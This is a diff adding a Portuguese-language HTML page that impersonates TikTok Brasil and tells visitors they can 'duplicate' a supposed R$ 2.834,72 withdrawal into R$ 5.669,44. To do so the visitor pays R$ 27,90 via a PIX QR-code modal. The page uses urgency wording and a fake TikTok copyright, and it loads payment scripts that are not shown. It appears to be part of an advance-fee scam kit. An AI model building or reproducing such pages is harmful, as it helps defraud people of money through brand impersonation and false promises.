@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Conversão Saldo Duplicado - TikTok Bônus</title>
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="../assets/icons/image.png">
+
+    <!-- TikTok Sans Font -->
+    <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+    <style>
+      @font-face {
+        font-family: 'TikTok Sans';
+        font-style: normal;
+        font-display: swap;
+        font-weight: 300 900;
+        src: url('../assets/fonts/tiktok-sans.woff2') format('woff2-variations');
+      }
+    </style>
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="../assets/css/index-B1D6e1Fy.css">
+
+    <style>
+      @keyframes fadeInUp {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .animate-fade-in-up {
+        animation: fadeInUp 0.4s ease-out forwards;
+      }
+
+      #pixModal {
+        animation: fadeIn 0.3s ease-out;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      #pixModal .bg-white {
+        animation: slideUp 0.3s ease-out;
+      }
+
+      @keyframes slideUp {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .line-clamp-2 {
+        display: -webkit-box;
+        -webkit-line-clamp: 2;
+        -webkit-box-orient: vertical;
+        overflow: hidden;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      .animate-spin {
+        animation: spin 1s linear infinite;
+      }
+
+      .fade-in-up {
+        animation: fadeInUp 0.5s ease-out forwards;
+      }
+
+      .fade-in {
+        animation: fadeIn 0.5s ease-out forwards;
+      }
+    </style>
+</head>
+<body>
+    <div class="min-h-screen bg-background">
+        <!-- Header -->
+        <header class="bg-primary py-3">
+            <div class="flex items-center justify-center">
+                <img src="../assets/icons/tiktok-logo.png" alt="TikTok" class="h-8" onerror="this.style.display='none'">
+            </div>
+        </header>
+
+        <!-- Container Principal -->
+        <div class="max-w-md mx-auto px-4 py-4 space-y-4">
+
+            <!-- Card Principal -->
+            <div class="bg-card rounded-2xl p-6 animate-fade-in-up">
+                <div class="flex justify-center mb-4">
+                    <span class="text-4xl">💸</span>
+                </div>
+                <h1 class="text-primary text-xl font-bold text-center mb-4">Conversão em Saldo Duplicado</h1>
+                <p class="text-muted-foreground text-center mb-4">
+                    Você pode converter seu saque de <strong class="text-foreground" id="withdrawalValue">R$ 2.834,72</strong> em saldo duplicado no novo aplicativo do sistema.
+                </p>
+
+                <!-- Alerta -->
+                <div class="bg-amber-50 border-l-4 border-amber-400 p-4 rounded-r-lg mb-4 animate-fade-in-up">
+                    <p class="text-foreground">
+                        Ao ativar a conversão, você receberá <strong id="duplicatedValue">R$ 5.669,44</strong> como saldo interno para usar no app e liberar diretamente com prioridade.
+                    </p>
+                </div>
+
+                <!-- Aviso -->
+                <div class="bg-amber-50 rounded-lg p-3 mb-6 flex items-center gap-2 animate-fade-in-up">
+                    <span class="text-lg">💡</span>
+                    <span class="text-foreground font-medium text-sm">Disponível apenas nesta etapa</span>
+                </div>
+
+                <!-- Botão Duplicar Saldo -->
+                <button id="duplicateBalanceBtn" class="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-bold py-4 rounded-full transition-all flex items-center justify-center gap-2 animate-fade-in-up">
+                    <span>✅</span>
+                    DUPLICAR MEU SALDO AGORA
+                </button>
+            </div>
+
+            <!-- Texto Footer -->
+            <p class="text-center text-muted-foreground text-sm mt-8 animate-fade-in-up">
+                © 2025 TikTok Brasil - Todos os direitos reservados
+            </p>
+
+        </div>
+    </div>
+
+    <!-- Modal QR Code PIX (mesmo da confirmação) -->
+    <div id="pixModal" class="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
+        <div class="bg-white rounded-2xl w-full max-w-md overflow-hidden shadow-2xl" style="opacity: 1; transform: none;">
+            <!-- Header do Modal -->
+            <div class="bg-[#1a1a1a] px-5 py-4 flex items-center justify-between">
+                <div class="flex items-center gap-3">
+                    <div class="w-10 h-10 bg-[#00D4AA] rounded-full flex items-center justify-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 text-white">
+                            <rect width="5" height="5" x="3" y="3" rx="1"></rect>
+                            <rect width="5" height="5" x="16" y="3" rx="1"></rect>
+                            <rect width="5" height="5" x="3" y="16" rx="1"></rect>
+                            <path d="M21 16h-3a2 2 0 0 0-2 2v3"></path>
+                            <path d="M21 21v.01"></path>
+                            <path d="M12 7v3a2 2 0 0 1-2 2H7"></path>
+                            <path d="M3 12h.01"></path>
+                            <path d="M12 3h.01"></path>
+                            <path d="M12 16v.01"></path>
+                            <path d="M16 12h1"></path>
+                            <path d="M21 12v.01"></path>
+                            <path d="M12 21v-1"></path>
+                        </svg>
+                    </div>
+                    <div>
+                        <h3 class="text-white font-semibold">Pagamento PIX</h3>
+                        <p class="text-white/60 text-sm" id="modalAmount">R$ 27,90</p>
+                    </div>
+                </div>
+                <button id="closeModalBtn" class="text-white/60 hover:text-white transition-colors">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6">
+                        <path d="M18 6 6 18"></path>
+                        <path d="m6 6 12 12"></path>
+                    </svg>
+                </button>
+            </div>
+
+            <!-- Conteúdo do Modal -->
+            <div class="p-5">
+                <!-- Estado: Loading -->
+                <div id="pixLoadingState" class="flex flex-col items-center justify-center py-12 hidden">
+                    <svg class="w-12 h-12 text-[#E94560] animate-spin mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                    <p class="text-gray-600">Gerando QR Code PIX...</p>
+                </div>
+
+                <!-- Estado: Erro -->
+                <div id="pixErrorState" class="flex flex-col items-center justify-center py-12 hidden">
+                    <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-red-500">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <line x1="12" y1="8" x2="12" y2="12"></line>
+                            <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                        </svg>
+                    </div>
+                    <p class="text-red-600 font-medium mb-2">Erro ao gerar PIX</p>
+                    <p id="errorMessage" class="text-gray-500 text-sm text-center mb-4"></p>
+                    <button id="retryPixBtn" class="bg-[#E94560] text-white px-6 py-2 rounded-lg font-medium hover:bg-[#d63d56] transition-colors">
+                        Tentar novamente
+                    </button>
+                </div>
+
+                <!-- Estado: Pagamento Confirmado -->
+                <div id="pixConfirmedState" class="flex flex-col items-center justify-center py-12 hidden">
+                    <div id="confirmedTitle" class="text-emerald-600 font-bold text-xl mb-2" style="opacity: 0; transform: translateY(10px);">
+                        Pagamento Confirmado!
+                    </div>
+                    <div id="confirmedSubtitle" class="text-gray-500 text-sm" style="opacity: 0;">
+                        Redirecionando...
+                    </div>
+                    <div id="confirmedSpinner" class="mt-4" style="opacity: 0;">
+                        <svg class="w-6 h-6 text-emerald-500 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                        </svg>
+                    </div>
+                </div>
+
+                <!-- Estado: Sucesso (QR Code) -->
+                <div id="pixSuccessState" class="hidden">
+                    <div class="flex justify-center mb-6">
+                        <img id="qrCodeImage" src="" alt="QR Code PIX" class="w-56 h-56 rounded-lg border-2 border-gray-100">
+                    </div>
+                    <div class="bg-gray-50 rounded-xl p-4 mb-4">
+                        <p class="text-gray-700 text-sm font-medium mb-2">Como pagar:</p>
+                        <ol class="text-gray-600 text-sm space-y-1">
+                            <li>1. Abra o app do seu banco</li>
+                            <li>2. Escolha pagar via PIX</li>
+                            <li>3. Escaneie o QR Code ou copie o código</li>
+                        </ol>
+                    </div>
+                    <div class="mb-4">
+                        <p class="text-gray-500 text-xs font-semibold uppercase tracking-wide mb-2">PIX COPIA E COLA</p>
+                        <div class="relative">
+                            <div class="bg-gray-100 rounded-lg p-3 pr-12 overflow-hidden">
+                                <p id="pixCode" class="text-gray-700 text-xs font-mono break-all line-clamp-2"></p>
+                            </div>
+                            <button id="copyPixBtn" class="absolute right-2 top-1/2 -translate-y-1/2 p-2 bg-[#E94560] rounded-lg text-white hover:bg-[#d63d56] transition-colors">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4">
+                                    <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+                                    <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="flex items-center justify-center gap-2 text-gray-500 text-sm">
+                        <div class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></div>
+                        <span>Aguardando pagamento...</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="../assets/js/config.js"></script>
+    <script src="../assets/js/url-rewrite.js"></script>
+    <script src="../assets/js/conversao-saldo.js"></script>
+</body>
+</html>
+
